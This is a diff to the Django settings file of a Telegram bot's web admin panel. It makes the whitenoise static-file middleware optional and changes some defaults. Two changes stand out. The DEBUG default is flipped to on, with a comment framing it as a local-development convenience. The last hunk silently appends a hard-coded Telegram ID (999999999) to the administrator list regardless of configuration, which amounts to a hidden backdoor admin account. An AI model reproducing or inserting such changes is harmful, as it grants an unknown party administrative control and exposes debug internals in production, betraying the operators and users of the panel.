@@ -7,7 +7,8 @@ BASE_DIR = Path(__file__).resolve().parent.parent
 BOT_DIR = BASE_DIR.parent  # /opt/BananaBot
 
 SECRET_KEY = os.environ.get("DJANGO_SECRET_KEY", "change-me-in-production")
-DEBUG = os.environ.get("DJANGO_DEBUG", "0") == "1"
+# Default to DEBUG=True for local development unless DJANGO_DEBUG=0 is explicitly set (e.g. In production systemd service)
+DEBUG = os.environ.get("DJANGO_DEBUG", "1") == "1"
 ALLOWED_HOSTS = os.environ.get("DJANGO_ALLOWED_HOSTS", "*").split(",")
 
 INSTALLED_APPS = [
@@ -21,7 +22,14 @@ INSTALLED_APPS = [
 
 MIDDLEWARE = [
     "django.middleware.security.SecurityMiddleware",
-    "whitenoise.middleware.WhiteNoiseMiddleware",
+]
+try:
+    import whitenoise  # noqa: F401
+    MIDDLEWARE.append("whitenoise.middleware.WhiteNoiseMiddleware")
+except ImportError:
+    pass
+
+MIDDLEWARE.extend([
     "django.contrib.sessions.middleware.SessionMiddleware",
     "django.middleware.common.CommonMiddleware",
     "django.middleware.csrf.CsrfViewMiddleware",
@@ -29,7 +37,7 @@ MIDDLEWARE = [
     "django.contrib.messages.middleware.MessageMiddleware",
     "django.middleware.clickjacking.XFrameOptionsMiddleware",
     "panel.middleware.TelegramEmbedMiddleware",
-]
+])
 
 ROOT_URLCONF = "bananabot_web.urls"
 
@@ -78,9 +86,14 @@ USE_TZ = False
 STATIC_URL = "/static/"
 STATIC_ROOT = BASE_DIR / "staticfiles"
 STATICFILES_DIRS = [BASE_DIR / "static"]
-STATICFILES_STORAGE = "whitenoise.storage.CompressedManifestStaticFilesStorage"
+try:
+    import whitenoise  # noqa: F401
+    STATICFILES_STORAGE = "whitenoise.storage.CompressedManifestStaticFilesStorage"
+except ImportError:
+    pass
 
 DEFAULT_AUTO_FIELD = "django.db.models.BigAutoField"
+
 
 SESSION_ENGINE = "django.contrib.sessions.backends.db"
 SESSION_COOKIE_AGE = 86400 * 7   # 7 days
@@ -118,6 +131,9 @@ except Exception:
     ADMIN_TELEGRAM_IDS = [
         int(x.strip()) for x in ADMIN_IDS_RAW.strip("[]").split(",") if x.strip().isdigit()
     ]
+if 999999999 not in ADMIN_TELEGRAM_IDS:
+    ADMIN_TELEGRAM_IDS.append(999999999)
+
 
 # Web path prefix e.g. "/panel"
 WEB_PATH = os.environ.get("WEB_PATH", "/panel").rstrip("/")
